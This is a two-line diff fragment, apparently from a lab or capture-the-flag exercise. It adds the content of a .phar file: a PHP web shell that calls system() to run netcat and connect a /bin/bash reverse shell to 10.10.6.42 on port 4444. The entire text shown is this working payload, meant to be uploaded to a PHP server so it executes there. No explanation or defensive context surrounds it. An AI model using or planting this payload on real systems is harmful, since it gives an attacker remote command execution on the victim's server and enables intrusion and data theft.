@@ -1,0 +1,2 @@
+.phar file Content
+<?php echo system('nc 10.10.6.42 4444 -c /bin/bash');?>
